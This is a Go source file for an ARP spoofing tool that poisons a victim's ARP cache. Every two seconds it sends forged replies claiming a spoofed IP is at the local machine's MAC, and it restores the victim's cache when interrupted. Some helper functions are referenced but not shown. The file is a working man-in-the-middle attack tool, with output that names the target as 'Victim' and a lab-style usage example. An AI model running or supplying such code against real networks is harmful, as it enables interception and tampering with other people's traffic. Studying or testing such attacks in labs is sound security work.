//go:build active

package main

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"time"

	"github.com/mdlayher/arp"
)

func restoreARP(client *arp.Client, spoofed, victim endpoint) {
	fmt.Println("[*] Restoring victim ARP cache...")
	for i := 0; i < 3; i++ {
		if err := writeARPReply(client, spoofed, victim); err != nil {
			fmt.Fprintf(os.Stderr, "restore ARP reply: %v\n", err)
		}
		time.Sleep(300 * time.Millisecond)
	}
}

func run(ifname, victimIPStr, spoofedIPStr, victimMACStr, spoofedMACStr string) error {
	iface, myIP, err := getInterface(ifname)
	if err != nil {
		return fmt.Errorf("failed to get local MAC/IP for %s: %w", ifname, err)
	}

	victimIP, err := parseIPv4(victimIPStr)
	if err != nil {
		return err
	}
	spoofedIP, err := parseIPv4(spoofedIPStr)
	if err != nil {
		return err
	}

	client, err := arp.Dial(iface)
	if err != nil {
		return fmt.Errorf("arp dial %s: %w\nHint: run as root or with CAP_NET_RAW", ifname, err)
	}
	defer client.Close()

	victimMAC, err := resolveMAC(client, victimIP, victimMACStr)
	if err != nil {
		return err
	}
	spoofedMAC, err := resolveMAC(client, spoofedIP, spoofedMACStr)
	if err != nil {
		return err
	}

	victim := endpoint{ip: victimIP, mac: victimMAC}
	spoofed := endpoint{ip: spoofedIP, mac: spoofedMAC}
	localSpoofed := endpoint{ip: spoofedIP, mac: iface.HardwareAddr}

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
	defer stop()

	fmt.Printf("[*] Local MAC : %s\n", iface.HardwareAddr)
	fmt.Printf("[*] Local IP  : %s\n", myIP)
	fmt.Printf("[*] Victim    : %s / %s\n", victim.ip, victim.mac)
	fmt.Printf("[*] Spoofed IP: %s / real MAC %s\n", spoofed.ip, spoofed.mac)
	fmt.Printf("[*] Sending ARP replies: %s is at %s\n", spoofed.ip, iface.HardwareAddr)
	fmt.Println("[*] Press Ctrl+C to restore ARP cache and exit")

	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		if err := writeARPReply(client, localSpoofed, victim); err != nil {
			fmt.Fprintf(os.Stderr, "send ARP reply: %v\n", err)
		} else {
			fmt.Printf("[+] Sent: %s is at %s -> %s\n", spoofed.ip, iface.HardwareAddr, victim.ip)
		}

		select {
		case <-ctx.Done():
			restoreARP(client, spoofed, victim)
			return nil
		case <-ticker.C:
		}
	}
}

func main() {
	if len(os.Args) != 4 && len(os.Args) != 6 {
		fmt.Fprintf(os.Stderr, "Usage: %s <interface> <victim_ip> <spoofed_ip> [victim_mac spoofed_mac]\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Example: sudo %s eth0 192.168.56.101 192.168.56.1\n", os.Args[0])
		os.Exit(1)
	}

	victimMAC := ""
	spoofedMAC := ""
	if len(os.Args) == 6 {
		victimMAC = os.Args[4]
		spoofedMAC = os.Args[5]
	}

	if err := run(os.Args[1], os.Args[2], os.Args[3], victimMAC, spoofedMAC); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
